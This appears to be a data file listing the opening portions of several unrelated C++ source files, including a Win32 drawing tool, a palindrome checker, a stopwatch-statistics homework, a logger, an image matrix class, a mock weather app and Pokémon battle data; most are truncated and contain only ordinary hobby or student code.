    "\ufeff#ifndef UNICODE\r\n#define UNICODE\r\n#endif \r\n\r\n#include <windows.h>\r\n#include<stdio.h>\r\n#include <iomanip>\r\n#include <tchar.h>  \r\n#include<fstream>\r\n#include<map>\r\n#include<string>\r\n#include <cmath>  \r\n#include <vector>  \r\n#include<iostream>\r\nusing namespace std;\r\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);\r\n\r\nenum type {\r\n    none,\r\n    circle,\r\n    rectangle,\r\n    line,\r\n    fre,\r\n    multiline,\r\n    curve,\r\n    save,\r\n    lin\r\n};\r\n\r\nenum color {\r\n    black,\r\n    red\r\n};\r\n\r\ntype curtype = none;\r\n\r\nstruct info {\r\n    type filetype = none;\r\n    POINT pos1 = { 0,0 };\r\n    POINT pos2 = { 0,0 };\r\n    POINT pos3 = { 0,0 };\r\n    POINT pos4 = { 0,0 };\r\n    color col = black;\r\n};\r\n\r\nstruct multilines {\r\n    info p[100];\r\n    int mpointer = 0;\r\n};\r\n\r\nLPCWSTR stringToLPCWSTR(std::string orig)\r\n{\r\n    size_t origsize = orig.length() + 1;\r\n    const size_t newsize = 100;\r\n    size_t convertedChars = 0;\r\n    wchar_t* wcstring = (wchar_t*)malloc(sizeof(wchar_t) * (orig.length() - 1));\r\n    mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);\r\n    return wcstring;\r\n}\r\n\r\ntypedef struct\r\n{\r\n    POINT c;\r\n    int r;\r\n}CIRCLE;\r\n\r\nvoid IntersectionOf2Circles(CIRCLE c1, CIRCLE c2, POINT& P1, POINT& P2)\r\n{\r\n    int a1, b1, R1, a2, b2, R2;\r\n    a1 = c1.c.x;\r\n    b1 = c1.c.y;\r\n    R1 = c1.r;\r\n\r\n    a2 = c2.c.x;\r\n    b2 = c2.c.y;\r\n    R2 = c2.r;\r\n    int R1R1 = R1 * R1;\r\n    int a1a1 = a1 * a1;\r\n    int b1b1 = b1 * b1;\r\n    int a2a2 = a2 * a2;\r\n    int b2b2 = b2 * b2;\r\n    int R2R2 = R2 * R2;\r\n    int subs1 = a1a1 - 2 * a1 * a2 + a2a2 + b1b1 - 2 * b1 * b2 + b2b2;\r\n    int subs2 = -R1R1 * a1 + R1R1 * a2 + R2R2 * a1 - R2R2 * a2 + a1a1 * a1 - a1a1 * a2 - a1 * a2a2 + a1 * b1b1 - 2 * a1 * b1 * b2 + a1 * b2b2 + a2a2 * a2 + a2 * b1b1 - 2 * a2 * b1 * b2 + a2 * b2b2;\r\n    int subs3 = -R1R1 * b1 + R1R1 * b2 + R2R2 * b1 - R2R2 * b2 + a1a1 * b1 + a1a1 * b2 - 2 * a1 * a2 * b1 - 2 * a1 * a2 * b2 + a2a2 * b1 + a2a2 * b2 + b1b1 * b1 - b1b1 * b2 - b1 * b2b2 + b2b2 * b2;\r\n    int sigma = sqrt((R1R1 + 2 * R1 * R2 + R2R2 - a1a1 + 2 * a1 * a2 - a2a2 - b1b1 + 2 * b1 * b2 - b2b2) * (-R1R1 + 2 * R1 * R2 - R2R2 + subs1));\r\n    if (abs(subs1) > 0.0000001)//\u5206\u6bcd\u4e0d\u4e3a0\r\n    {\r\n        P1.x = (subs2 - sigma * b1 + sigma * b2) / (2 * subs1);\r\n        P2.x = (subs2 + sigma * b1 - sigma * b2) / (2 * subs1);\r\n\r\n        P1.y = (subs3 + sigma * a1 - sigma * a2) / (2 * subs1);\r\n        P2.y = (subs3 - sigma * a1 + sigma * a2) / (2 * subs1);\r\n    }\r\n\r\n}\r\n\r\n//\u6c42\u5782\u8db3\r\ntypedef struct Line {\r\n    POINT  startPoint;\r\n    POINT  endPoint;\r\n}Line;\r\n\r\n//\u6c42\u70b9\u5230\u76f4\u7ebf\u7684\u8ddd\u79bb \u548c \u5782\u8db3\r\ndouble getDistanceP2L(POINT point, Line line, POINT& p_point)\r\n{\r\n    double x1 = line.startPoint.x;\r\n    double y1 = line.startPoint.y;\r\n    double x2 = line.endPoint.x;\r\n    double y2 = line.endPoint.y;\r\n    double x0 = point.x;\r\n    double y0 = point.y;\r\n\r\n    double k = x1 == x2 ? 100000 : (y2 - y1) / (x2 - x1);//\u5f53x1=x2\u65f6\uff0c\u7ed9\u659c\u7387\u8bbe\u4e00\u4e2a\u8f83\u5927\u503c100000\r\n    double a = k;\r\n    double b = -1;\r\n    double c = y1 - k * x1;\r\n    //\u5782\u8db3\r\n    double px = (b * b * x0 - a * b * y0 - a * c) / (a * a + b * b);\r\n    double py = (a * a * y0 - a * b * x0 - b * c) / (a * a + b * b);\r\n    p_point.x = px;\r\n    p_point.y = py;\r\n    double d = abs(a * x0 + b * y0 + c) / sqrt(a * a + b * b);\r\n    return d;\r\n}\r\n\r\n//\u8ba1\u7b97\u4e24\u4e2a\u7ebf\u6bb5\u7684\u4ea4\u70b9\r\n// \u5b9a\u4e49\u76f4\u7ebf\u53c2\u6570\u7ed3\u6784\u4f53  \r\nstruct LinePara\r\n{\r\n    float k;\r\n    float b;\r\n};\r\n\r\n// \u83b7\u53d6\u76f4\u7ebf\u53c2\u6570  \r\nvoid getLinePara(float& x1, float& y1, float& x2, float& y2, LinePara& LP)\r\n{\r\n    double m = 0;\r\n    m = x2 - x1;\r\n    if (0 == m)\r\n    {\r\n        LP.k = 10000.0;\r\n        LP.b = y1 - LP.k * x1;\r\n    }\r\n    else\r\n    {\r\n        LP.k = (y2 - y1) / (x2 - x1);\r\n        LP.b = y1 - LP.k * x1;\r\n    }\r\n}\r\n\r\n// \u83b7\u53d6\u4ea4\u70b9  \r\nbool getCross(float& x1, float& y1, float& x2, float& y2, float& x3, float& y3, float& x4, float& y4, POINT& pt) {\r\n    LinePara para1, para2;\r\n    getLinePara(x1, y1, x2, y2, para1);\r\n    getLinePara(x3, y3, x4, y4, para2);\r\n    if (abs(para1.k - para2.k) > 0.5)\r\n    {\r\n        pt.x = (para2.b - para1.b) / (para1.k - para2.k);\r\n        pt.y = para1.k * pt.x + para1.b;\r\n        return true;\r\n    }\r\n    else\r\n    {\r\n        return false;\r\n    }\r\n}\r\n \r\nstd::vector<POINT> findSegmentCircleIntersections(double x1, double y1, double x2, double y2, double x_start, double y_start, double x_end, double y_end) {\r\n    std::vector<POINT> intersections; \r\n    double h = (x1 + x2) / 2;\r\n    double k = (y1 + y2) / 2;\r\n    double r = min((x2 - x1) / 2, (y2 - y1) / 2);\r\n    double dx = x_end - x_start;\r\n    double dy = y_end - y_start;\r\n    double A = dx * dx + dy * dy;\r\n    double B = 2 * (dx * (x_start - h) + dy * (y_start - k));\r\n    double C = (x_start - h) * (x_start - h) + (y_start - k) * (y_start - k) - r * r;\r\n    double D = B * B - 4 * A * C;\r\n\r\n    if (D >= 0) { // \u6709\u4ea4\u70b9  \r\n        double t1 = (-B + sqrt(D)) / (2 * A);\r\n        double t2 = (-B - sqrt(D)) / (2 * A);\r\n        POINT p1, p2;\r\n        if (0 <= t1 && t1 <= 1) {\r\n            p1.x = x_start + t1 * dx;\r\n            p1.y = y_start + t1 ",
    "#include <iostream>\r\n#include <string>\r\n#include <functional>\r\n\r\nlong long number, reversed, constValue;\r\n//Function called in the main function to get the value of the number\r\nvoid userInput()\r\n{\r\n    {\r\n        std::cout<<\"Enter the number you want to check if it's a palyndrome:\\n\";\r\n        std::cin>>number;\r\n        constValue = number;\r\n    }\r\n}    \r\nint main()\r\n{\r\n    //Calling userInput to get the value of the number we want to check first\r\n    userInput();\r\n    if(number < 0)\r\n    {\r\n        std::cout<<\"The number is not a palyndrome, as it's a negative number.\\n\";\r\n    }else\r\n    {\r\n        // Simple maths to reverse the number without converting it to string\r\n        while(number != 0)\r\n        {\r\n            reversed = reversed * 10;\r\n            reversed = reversed + number % 10;\r\n            number = number / 10;\r\n        }\r\n        //Simple conditions to check if it's a palyndrome or not\r\n        if(constValue == reversed)\r\n        {\r\n            //Outputting that the number is palyndrome if it is equal to the original value after being reversed\r\n            std::cout<<\"The number is a palyndrome, as it's equal to it's original value after being reversed and it's not negative.\";\r\n        }else\r\n        {\r\n            //Outputting that the number is not a palyndrome if it is not equal to the original value after being reversed\r\n            std::cout<<\"The number is not a palyndrome, as it's not equal to it's original value after being reversed.\\n\";\r\n        }    \r\n    }\r\n    return 0;\r\n}\r\n",
    "// Brij Malhotra\n// hw1.cpp\n// Purpose: Make a program that processes timing data produced by a stopwatch and shows stats \n\n#include <iostream>\n#include \"fileUtils.h\"\n#include <fstream>\n\nusing namespace std;\n\nstruct Stats{\n    int numLaps = 0;\n    int totalLaptime = 0;\n    int maxLap = 0;\n    int minLap = 0;\n    int avgLap = 0;\n    int * arrPtr = nullptr;\n\n};\n\n// Function prototypes\n\nStats readFile(char * filename);\nchar mainMenu();\nvoid goodbyeMsg();\nvoid listFiles(int argc, char *argv[]);\ndouble avgAvg(Stats arr[], int numFiles);\nlong totTotal(Stats arr[], int numFiles);\nvoid displayStats(Stats userChoice);\n\nint main (int argc, char *argv[]) {\n    \n    int fileChoice = 0;\n    char choice;\n\n    Stats fileArr[6];       \n    for (int i = 1; i < argc; i++){         // This code segment creates an array for each of the files in use \n        fileArr[i] = readFile(argv[i]);\n    }\n\n\n    while(choice != '5'){       // For menu choice 2 I could not figure out how to individually show the details by asking the user for\n        choice = mainMenu();    // the filename and then moving onto to trigger the readFile function and then proceed to the displaystats function\n        if(choice == '1'){\n            listFiles(argc, argv);\n            cout << endl << endl;\n        }else if(choice == '2'){\n            cout << \" Which file would you like to see stats for? (Enter the number of the file): \";   \n            cin >> fileChoice;\n            while (fileChoice < 1 || fileChoice > argc - 1){    // -1 has been put because it counts the program execution as an argument \n                cout << \" Please enter a number between 1 and \" <<  argc - 1 <<  \". \" << endl;\n                cin >> fileChoice;\n            }\n            displayStats(fileArr[fileChoice]);    \n        }else if(choice == '3'){\n            cout << avgAvg(fileArr, argc) << \" ms\";\n            cout << endl << endl;\n        }else if(choice == '4'){\n            cout << totTotal(fileArr, argc) << \" ms\";\n            cout << endl << endl;            \n        }else if(choice == '5'){\n            goodbyeMsg();\n            cout << endl << endl;\n        }else{\n            cout << \"That is not a valid input. Please enter your choice again.\";\n            cout << endl << endl;\n        }\n    }\n    return 0;\n}\n\n// Function declaration\n\nStats readFile(char * filename){        // This function reads in from the file into a dynamically stored array\n    Stats fstats;\n    ifstream input;\n\n    input.open(filename);\n    fstats.numLaps = readByte(input);\n    fstats.arrPtr = new int[fstats.numLaps];\n\n    for (int i = 0; i < fstats.numLaps; i++){\n        fstats.arrPtr[i] = readInt(input);\n        if (fstats.arrPtr[i] > fstats.maxLap) {\n            fstats.maxLap = fstats.arrPtr[i];\n        }\n        if (fstats.minLap == 0 || fstats.arrPtr[i] < fstats.minLap) {\n            fstats.minLap = fstats.arrPtr[i];\n        }\n        fstats.totalLaptime += fstats.arrPtr[i];\n    }\n\n    fstats.avgLap = fstats.totalLaptime / fstats.numLaps; \n\n    input.close();\n\n    return fstats;\n}\n\nchar mainMenu(){        // This function is the mainmenu for the program\n    \n    char choice;\n\n    cout << endl;\n    cout << \"Menu for stopwatch data:\" << endl << endl;\n    cout << \"1. List the names of the files that have been loaded.\" << endl;\n    cout << \"2. Stats for particular file\" << endl;\n    cout << \"3. The average (mean) time of all averages of files\" << endl;\n    cout << \"4. The total time (sum) of all laps across the files\" << endl;\n    cout << \"5. Exit this program\" << endl << endl;\n\n    cout << \"Please enter your choice: \";\n    cin >> choice;\n    cout << endl << endl;\n\n    return choice;\n}\n\nvoid goodbyeMsg(){      // This function is the message given out when the user quits the program\n    \n    cout << endl;\n    cout << \"Hope the stats were satisfactory, goodbye. \" << endl << endl;\n}\n\nvoid listFiles(int argc, char *argv[]){     // This function lists down the files being used for the program\n    \n    cout << \"The number of files being used are: \" << argc - 1 << endl;\n\n    for (int i = 1; i < argc; i++){\n        char *argument = argv[i];\n        cout << \"Argument \" << i << \": \" << argument << endl;\n    }\n}\n\nvoid displayStats(Stats userChoice){        // This function displays the stats of the file\n\n    cout << \" The number of laps in this file are: \" << userChoice.numLaps << endl;\n    cout << \" The maximum laptime in this file is: \" << userChoice.maxLap << \" ms\" << endl;\n    cout << \" The minimum laptime in thie file is: \" << userChoice.minLap << \" ms\" <<endl;\n    cout << \" The average of the laptimes in this file is: \" << userChoice.avgLap << \" ms\" << endl;\n    cout << \" The sum of the laptimes in this file is: \" << userChoice.totalLaptime << \" ms\" << endl;\n}\n\ndouble avgAvg(Stats arr[], int argc){       // This function displayes the average of the averages of all files\n\n    double sumAvg = 0;\n    double avgAverage = 0;\n\n    for (int i = 0; i < argc; i++){\n        sumAvg += arr[i].avgLap;\n    }\n\n    avgAver",
    "#include \"breakout/core/logger.hpp\"\n\n#include <atomic>\n#include <condition_variable>\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <mutex>\n#include <thread>\n#include <vector>\n#include <cassert>\n\n#if defined(_WIN32)\n    #include \"WinLite/windows.h\" // for OutputDebugStringA\n#endif\n\n\nnamespace bk::logger\n{\n    ThreadId Context::getThreadId()\n    {\n        auto const get_next_id = []\n        {\n            static auto s_prevId{std::atomic<int>{}};\n            return s_prevId++;\n        };\n        thread_local auto const s_thisThreadId{get_next_id()};\n        return ThreadId{s_thisThreadId};\n    }\n\n    Context Context::make(std::string_view category, Level level)\n    {\n        return Context{\n            .category  = category,\n            .timestamp = Clock::now(),\n            .thread    = getThreadId(),\n            .level     = level,\n        };\n    }\n\n    Context Context::make(std::string_view category, Level level, std::string_view function, std::string_view filePath, int currentLine)\n    {\n        return Context{\n            .category  = category,\n            .timestamp = Clock::now(),\n            .thread    = getThreadId(),\n            .level     = level,\n            .func      = function,\n            .file      = filePath,\n            .line      = currentLine,\n        };\n    }\n} // namespace bk::logger\n\nnamespace bk::logger\n{\n    namespace\n    {\n        namespace fs = std::filesystem;\n\n        void append_timestamp(std::string & out, Clock::time_point const & timestamp, Timestamp const mode)\n        {\n            static auto s_mutex{std::mutex{}};\n            static constexpr std::size_t buf_size_v{64};\n            auto buffer     = std::array<char, buf_size_v>{};\n            auto const time = Clock::to_time_t(timestamp);\n\n            auto lock = std::unique_lock{s_mutex};\n            auto const tm_struct = mode == Timestamp::eUtc ? *std::gmtime(&time) : *std::localtime(&time);\n            lock.unlock();\n            std::strftime(buffer.data(), buffer.size(), \"%F %T\", &tm_struct);\n            out.append(buffer.data());\n        }\n\n        struct Formatter\n        {\n            static constexpr auto open_v{'{'};\n            static constexpr auto close_v{'}'};\n\n            struct Data\n            {\n                FixedString<Config::format_size_v> format{};\n                Timestamp timestamp{};\n            };\n\n            Data const & data;\n            std::string_view message;\n            Context const & context;\n\n            std::string out{};\n            std::string_view format{data.format};\n            char current{};\n\n            [[nodiscard]] bool at_end() const { return format.empty(); }\n\n            bool advance()\n            {\n                if (at_end())\n                {\n                    current = {};\n                    return false;\n                }\n                current = format.front();\n                format  = format.substr(1);\n                return true;\n            }\n\n            bool try_keyword()\n            {\n                assert(current == open_v);\n                auto const close = format.find_first_of(close_v);\n                if (close == std::string_view::npos) { return false; }\n\n                auto const key = format.substr(0, close);\n                if (!keyword(key)) { return false; }\n\n                format = format.substr(close + 1);\n                return true;\n            }\n\n            bool keyword(std::string_view key)\n            {\n                if (key == \"level\")\n                {\n                    out += levelChar(context.level);\n                    return true;\n                }\n\n                if (key == \"thread\")\n                {\n                    std::format_to(std::back_inserter(out), \"{}\", static_cast<int>(context.thread));\n                    return true;\n                }\n\n                if (key == \"category\")\n                {\n                    out += context.category;\n                    return true;\n                }\n\n                if (key == \"message\")\n                {\n                    out.append(message);\n                    return true;\n                }\n\n                if (key == \"timestamp\")\n                {\n                    append_timestamp(out, context.timestamp, data.timestamp);\n                    return true;\n                }\n\n                if (key == \"func\")\n                {\n                    if (context.func.has_value()) { out += context.func.value(); }\n                    return true;\n                }\n\n                if (key == \"file\")\n                {\n                    if (context.file.has_value()) { out += context.file.value(); }\n                    return true;\n                }\n\n                if (key == \"line\")\n                {\n                    if (context.line.has_value()) { std::format_to(std::back_inserter(out), \"{}\", context.line.value()); }\n                    return true;\n                }\n\n                return false;\n            }\n\n            std::string ope",
    "#include \"matrix/bw_matrix.h\"\n\n#include <iomanip>\n#include <iostream>\n\nBWMatrix::BWMatrix()\n    : Matrix(0, 0, 1)\n{\n}\n\nBWMatrix::BWMatrix(const BWMatrix &mat)\n    : Matrix(mat)\n{\n}\nBWMatrix::BWMatrix(size_t rows, size_t cols)\n    : Matrix(rows, cols, 1)\n{\n}\n\nBWMatrix::BWMatrix(size_t rows, size_t cols, int init_val)\n    : Matrix(rows, cols, 1, init_val)\n{\n}\n\nvoid BWMatrix::print() const\n{\n    std::cout << *this << std::endl; // this / *this?\n}\n\nvoid BWMatrix::fromOpenCV(const cv::Mat &mat)\n{\n    if (mat.channels() != 1 || mat.depth() != CV_8U)\n    {\n        return;\n    }\n\n    rows_count_ = mat.rows;\n    columns_count_ = mat.cols;\n    data_.resize(mat.total());\n\n    for (size_t r = 0; r < rows_count_; ++r)\n    {\n        for (size_t c = 0; c < columns_count_; ++c)\n        {\n            at(r, c) = mat.at<uchar>(r, c);\n        }\n    }\n}\n\ncv::Mat BWMatrix::toOpenCV() const\n{\n    cv::Mat mat(rows_count_, columns_count_, CV_8UC1);\n\n    for (size_t r = 0; r < rows_count_; ++r)\n    {\n        for (size_t c = 0; c < columns_count_; ++c)\n        {\n            mat.at<uchar>(r, c) = at(r, c);\n        }\n    }\n\n    return mat;\n}\n\nbool BWMatrix::readImage(const std::string &path)\n{\n    cv::Mat bwImage = cv::imread(path, cv::IMREAD_GRAYSCALE);\n    if (bwImage.empty())\n    {\n        return false;\n    }\n    fromOpenCV(bwImage);\n    return true;\n}\n\nvoid BWMatrix::draw(const Shape &shape)\n{\n    int color = shape.getColor().getBW();\n    auto points = shape.getPoints();\n    for (size_t i = 0; i < points.size(); ++i)\n    {\n        int x = points[i].x;\n        int y = points[i].y;\n        if (x < 0 || y < 0 || x > columns_count_ || y > rows_count_)\n        {\n            continue;\n        }\n        at(y, x) = color;\n    }\n}\n\nBWMatrix BWMatrix::invert() const\n{\n    BWMatrix inverted = *this - 255;\n    inverted = inverted * (-1);\n    return inverted;\n}\n\nBWMatrix &BWMatrix::operator=(const BWMatrix &mat)\n{\n    Matrix::operator=(mat);\n    return *this;\n}\n\n// std::ostream &operator<<(std::ostream &out, const Matrix &mat)\n// {\n//     if (mat.data_.empty())\n//     {\n//         out << \"(An empty matrix)\" << std::endl;\n//         return out;\n//     }\n\n//     for (size_t row = 0; row < mat.getRows(); ++row)\n//     {\n//         for (size_t col = 0; col < mat.getCols(); ++col)\n//         {\n//             out << (col > 0 ? \" \" : \"\") << std::setw(4);\n//             out << mat.at(row, col, 0);\n//         }\n//         out << std::endl;\n//     }\n//     return out;\n// }\n\nBWMatrix BWMatrix::add(int val) const\n{\n    BWMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::add(res, val);\n    return res;\n}\n\nBWMatrix BWMatrix::subtract(int val) const\n{\n    BWMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::subtract(res, val);\n    return res;\n}\n\nBWMatrix BWMatrix::multiply(int val) const\n{\n    BWMatrix res(rows_count_, columns_count_, channels_count_);\n    Matrix::multiply(res, val);\n    return res;\n}\n\nBWMatrix BWMatrix::operator+(int val) const\n{\n    return add(val);\n}\n\nBWMatrix BWMatrix::operator-(int val) const\n{\n    return subtract(val);\n}\n\nBWMatrix BWMatrix::operator*(int val) const\n{\n    return multiply(val);\n}",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <map>\n#include <algorithm>\n#include <exception>\n\nusing namespace std;\n\nclass Location {\npublic:\n    string name;\n    double latitude;\n    double longitude;\n\n    Location(const string& name, double latitude, double longitude)\n        : name(name), latitude(latitude), longitude(longitude) {}\n};\n\nclass LocationManager {\nprivate:\n    vector<Location> locations;\n\npublic:\n    void addLocation(const string& name, double latitude, double longitude) {\n        locations.push_back(Location(name, latitude, longitude));\n    }\n\n    void removeLocation(const string& name) {\n        locations.erase(remove_if(locations.begin(), locations.end(),\n            [&name](const Location& loc) { return loc.name == name; }),\n            locations.end());\n    }\n\n    void listLocations() const {\n        for (const auto& loc : locations) {\n            cout << \"Name: \" << loc.name << \", Latitude: \" << loc.latitude << \", Longitude: \" << loc.longitude << endl;\n        }\n    }\n};\n\nclass WeatherVariable {\npublic:\n    string variableName;\n    double value;\n\n    WeatherVariable(const string& variableName, double value)\n        : variableName(variableName), value(value) {}\n};\n\nclass WeatherVariableManager {\nprivate:\n    vector<WeatherVariable> variables;\n\npublic:\n    void addVariable(const string& variableName, double value) {\n        variables.push_back(WeatherVariable(variableName, value));\n    }\n\n    void listVariables() const {\n        for (const auto& var : variables) {\n            cout << \"Variable: \" << var.variableName << \", Value: \" << var.value << endl;\n        }\n    }\n};\n\n// Class for both weather and air quality systems\nclass DataFetchingSystem {\nprotected:\n    string apiKey;\n    string baseUrl;\n\npublic:\n    DataFetchingSystem(const string& apiKey, const string& baseUrl)\n        : apiKey(apiKey), baseUrl(baseUrl) {}\n\n    virtual string fetchData(const string& endpoint, const map<string, string>& params) {\n        return \"API response\"; // Mock API call\n    }\n\n    virtual void handleApiResponse(const string& response) = 0;\n};\n\n// Weather Forecasting System\nclass WeatherForecastingSystem : public DataFetchingSystem {\npublic:\n    WeatherForecastingSystem(const string& apiKey, const string& baseUrl)\n        : DataFetchingSystem(apiKey, baseUrl) {}\n\n    string fetchForecast(const Location& location) {\n        return \"Mock Forecast data for \" + location.name;\n    }\n\n    void handleApiResponse(const string& response) override {\n        cout << response << endl;\n    }\n};\n\n// Historical Weather System\nclass HistoricalWeatherSystem : public DataFetchingSystem {\npublic:\n    HistoricalWeatherSystem(const string& apiKey, const string& baseUrl)\n        : DataFetchingSystem(apiKey, baseUrl) {}\n\n    string fetchHistoricalData(const Location& location, const string& startDate, const string& endDate) {\n        return \"Mock Historical data for \" + location.name + \" from \" + startDate + \" to \" + endDate;\n    }\n\n    void handleApiResponse(const string& response) override {\n        cout << response << endl;\n    }\n};\n\n// Data export functionality\nclass DataExporter {\npublic:\n    static void exportToCSV(const string& data, const string& filename) {\n        ofstream file(filename);\n        file << data;\n        file.close();\n    }\n\n    static void exportToJSON(const string& data, const string& filename) {\n        ofstream file(filename);\n        file << \"{\\\"data\\\":\\\"\" << data << \"\\\"}\";\n        file.close();\n    }\n};\n\n// Cloud storage system and offline support\nclass CloudStorageSystem {\nprivate:\n    bool isOffline;\n    string cloudServiceCredentials;\n\npublic:\n    CloudStorageSystem(const string& cloudServiceCredentials, bool isOffline = false)\n        : cloudServiceCredentials(cloudServiceCredentials), isOffline(isOffline) {}\n\n    void saveLocally(const string& data) {\n        ofstream file(\"local_data.txt\");\n        file << data;\n        file.close();\n    }\n\n    string retrieveLocally() {\n        ifstream file(\"local_data.txt\");\n        string data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());\n        return data;\n    }\n\n    void setOfflineMode(bool offline) {\n        isOffline = offline;\n    }\n\n    bool getOfflineMode() const {\n        return isOffline;\n    }\n};\n\n// User interface class for user interaction\nclass UserInterface {\npublic:\n    string getUserInput() {\n        string input;\n        getline(cin, input);\n        return input;\n    }\n\n    void handleExceptions(const exception& ex) {\n        cerr << \"Error: \" << ex.what() << endl;\n    }\n};\n\nint main() {\n    LocationManager locationManager;\n    WeatherVariableManager weatherVariableManager;\n    WeatherForecastingSystem weatherForecastingSystem(\"api_key\", \"https://api.weather.com\");\n    HistoricalWeatherSystem historicalWeatherSystem(\"api_key\", \"https://api.weather.com\");\n    CloudStorageSystem cloudStorageSystem(\"cloud_credentials\");\n    UserInterface ui;\n\n    while (true) {\n        cout << \"Menu:\\",
    "#include <iostream>\n#include <map>\n#include <string>\n#include <cmath>\n#include \"battle_effects.h\"\n#include \"moves.h\"\n#include \"battle.h\"\n// 11.9.23\n// What you were working on: Getting last_waza_kind working by having the\n// pokeclients keep track of their last used move\n// you looked through the game's code and prevMove does not get reset\n// if you use an item.  It only occurs when you use a move.\n// Switching and using items do not update the previous move\n// unless it is reset to NONE somewhere else, I don't think it ever gets reset\n// until you make another move even if you've switched pokemon\n\nPokeInfo::PokeInfo(std::string _name = \"None\", int _hp = 0, int _atk = 0, int _def = 0, int _spAtk = 0, int _spDef = 0, int _spd = 0, Type _primaryType = Type::None, Type _secondaryType = Type::None, AbilityId _ability = NO_ABILITY, AbilityId _ability2 = NO_ABILITY ){\n    name = _name;\n    hp = _hp;\n    atk = _atk;\n    def = _def;\n    spAtk = _spAtk;\n    spDef = _spDef;\n    spd = _spd;\n    primaryType = _primaryType;\n    secondaryType = _secondaryType;\n    ability = _ability;\n    ability2 = _ability2;\n}\n// id, power, accuracy, secondary?, secondaryAccuracy, MoveEffect, Move Type, DamageType attack, DamageType defend, priority, HighCritRatio?\n/*\nMove(MoveId _id, std::string _name, int _power = 0, int _accuracy = 0, bool _secondary = false, int _secondaryAccuracy = 0, int _effect = 0, Type _moveType = None, DamageType _defend = DamageType::NONE, DamageType _attack = DamageType::NONE, int _priority = 0, bool _highCritRatio = false, int _range = 0)\n*/\n\n// TODO: Implement spark (and paralysis)\n\nNature hardy = {100,100,100,100,100};\nNature docile = {100,100,100,100,100};\nNature serious = {100,100,100,100,100};\nNature bashful = {100,100,100,100,100};\nNature quirky = {100,100,100,100,100};\nNature lonely = {110,90,100,100,100};\nNature brave = {110,100,100,100,90};\nNature adamant = {110,100,90,100,100};\nNature naughty = {110,100,100,90,100};\nNature bold = {90,110,100,100,100};\nNature relaxed = {100,110,100,100,90};\nNature impish = {100,110,90,100,100};\nNature lax = {100,110,100,90,100};\nNature timid = {90,100,100,100,110};\nNature hasty = {100,90,100,100,110};\nNature jolly = {100,100,90,100,110};\nNature naive = {100,100,100,90,110};\nNature modest = {90,100,110,100,100};\nNature mild = {100,90,110,100,100};\nNature quiet = {100,100,110,100,90};\nNature rash = {100,100,110,90,100};\nNature calm = {90,100,100,110,100};\nNature gentle = {100,90,100,110,100};\nNature sassy = {100,100,100,110,90};\nNature careful = {100,100,90,110,100};\n\nstd::map<Mons, PokeInfo> pokemap = {\n    {CHIMCHAR, PokeInfo(\"Chimchar\", 44,58,44,58,44,61,Type::Fire,Type::None,BLAZE)},\n    {ONIX, PokeInfo(\"Onix\", 35,45,160,30,45,70,Type::Rock,Type::Ground,ROCK_HEAD)},\n    {GEODUDE, PokeInfo(\"Geodude\", 40,80,100,30,30,20,Type::Rock,Type::Ground,ROCK_HEAD)},\n    {CRANIDOS, PokeInfo(\"Cranidos\", 67,125,40,30,30,58,Type::Rock,Type::Rock,MOLD_BREAKER)},\n    {FLOATZEL, PokeInfo(\"Floatzel\", 85,105,55,85,50,115, Type::Water, Type::None, SWIFT_SWIM)},\n    {GYARADOS, PokeInfo(\"Gyarados\", 95,125,79,60,100,81, Type::Water, Type::Flying, INTIMIDATE)},\n    {QUAGSIRE, PokeInfo(\"Quagsire\", 95,85,85,65,65,35, Type::Water, Type::Ground, SIMPLE)},\n    {ROSELIA, PokeInfo(\"Roselia\", 50,60,45,100,80,65, Type::Grass, Type::Poison, NATURAL_CURE, POISON_POINT)},\n    {MONFERNO, PokeInfo(\"Monferno\", 64,78,52,78,52,81,Type::Fire,Type::Fighting,BLAZE)},\n    {SKUNTANK, PokeInfo(\"Skuntank\", 103,93,67,71,61,84,Type::Poison, Type::Dark, STENCH, AFTERMATH)},\n    {ZUBAT, PokeInfo(\"Zubat\", 40,45,35,30,40,55,Type::Poison,Type::Flying,INNER_FOCUS)},\n    {STARAVIA, PokeInfo(\"Staravia\", 55,75,50,40,40,80, Type::Flying, Type::Normal, INTIMIDATE)},\n    {PACHIRISU, PokeInfo(\"Pachirisu\", 60,45,70,45,90,95, Type::Electric, Type::None, RUN_AWAY)}, // pickup as well, but who cares we can't catch one anyway\n    {STARLY, PokeInfo(\"Starly\", 40, 55, 30, 30, 30, 60, Type::Normal, Type::Flying, KEEN_EYE)},\n    {MISMAGIUS, PokeInfo(\"Mismagius\", 60, 60, 60, 105, 105, 105, Type::Ghost, Type::None, LEVITATE)},\n    {EEVEE, PokeInfo(\"Eevee\", 55, 55, 50, 45, 65, 55, Type::Normal, Type::None, RUN_AWAY, ADAPTABILITY)},\n    {HIPPOPOTAS, PokeInfo(\"Hippopotas\", 68, 72, 78, 38, 42, 32, Type::Ground, Type::None, SAND_STREAM)},\n    {TOGETIC, PokeInfo(\"Togetic\", 55, 40, 85, 80, 105, 40, Type::Normal, Type::Flying, HUSTLE)},\n    {VAPOREON, PokeInfo(\"Vaporeon\", 130, 65, 60, 110, 95, 65, Type::Water, Type::None, WATER_ABSORB, WATER_ABSORB)},\n    {GOLBAT, PokeInfo(\"Golbat\", 75,80,70,65,75,90,Type::Poison,Type::Flying,INNER_FOCUS)},\n    {TOXICROAK, PokeInfo(\"Toxicroak\", 83, 106, 65, 86, 65, 85, Type::Poison, Type::Fighting, ANTICIPATION, DRY_SKIN)},\n    {HIPPOWDON, PokeInfo(\"Hippowdon\", 108, 112, 118, 68, 72, 47, Type::Ground, Type::None, SAND_STREAM)},\n    {JOLTEON, PokeInfo(\"Jolteon\", 65, 65, 60, 110, 95, 130, Type::Electric, Type::None, VOLT_ABSORB, VOLT_ABSORB)},\n    {RAICHU, PokeInfo(\"Raichu\", 60, 90, 55, 90, 80, 100, Type::Electric,",
